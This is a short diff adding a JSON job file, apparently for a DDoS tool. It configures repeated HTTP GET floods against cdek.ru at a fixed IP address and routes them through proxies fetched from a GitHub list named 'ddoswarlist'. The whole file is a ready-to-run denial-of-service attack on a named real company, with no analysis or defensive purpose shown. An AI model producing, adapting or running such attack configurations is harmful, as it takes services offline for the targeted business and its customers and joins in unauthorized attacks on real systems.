@@ -1,0 +1,20 @@
+{
+  "jobs": [{
+      "type": "http",
+      "count": 22,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://cdek.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.165.123.40:80",
+            "is_tls": false
+          },
+		  "proxy_urls": "{{ get_proxylist_by_url \"https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies.json\" }}"
+        }
+      }
+    }
+  ]
+}
